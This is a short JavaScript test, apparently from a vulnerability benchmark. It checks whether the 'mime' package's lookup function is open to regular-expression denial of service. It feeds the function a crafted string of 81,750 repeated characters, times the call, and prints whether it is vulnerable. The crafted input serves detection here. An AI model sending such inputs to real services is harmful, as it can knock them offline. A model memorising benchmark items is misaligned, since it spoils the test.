// test("ReDos in mime", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const mime = require("mime");
  let str = genstr(81750, "5") + "";
  let t = measureTime(function () {
    mime.lookup(str);
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
